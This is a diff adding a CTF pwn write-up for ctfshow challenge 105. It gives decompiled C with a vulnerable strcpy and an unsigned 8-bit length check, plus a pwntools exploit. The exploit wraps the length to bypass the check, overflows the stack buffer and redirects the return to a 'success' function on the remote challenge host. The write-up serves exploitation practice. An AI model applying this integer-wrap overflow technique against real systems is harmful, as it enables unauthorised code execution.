@@ -1018,3 +1018,38 @@ log.success("ret_addr: "+hex(ret_addr))
 io.interactive()
 ```
 
+## 105 unsigned_int8的轮回
+
+题目;
+
+```c
+char *__cdecl ctfshow(char *s)
+{
+  char dest[8]; // [esp+7h] [ebp-11h] BYREF
+  unsigned __int8 v3; // [esp+Fh] [ebp-9h]
+
+  v3 = strlen(s);
+  if ( v3 <= 3u || v3 > 8u )
+  {
+    puts("Authentication failed!");
+    exit(-1);
+  }
+  printf("Authentication successful, Hello %s", s);
+  return strcpy(dest, s);
+}
+```
+
+exp：
+
+```python
+from pwn import *
+#p = process('./pwn')
+p = remote('pwn.challenge.ctf.show',28155)
+elf = ELF('./pwn')
+shell = elf.sym['success']
+payload = b'a'*0x11+b'b'*0x4+p32(shell)
+payload = payload.ljust(256+4,b'a')
+p.sendline(payload)
+p.interactive()
+```
+
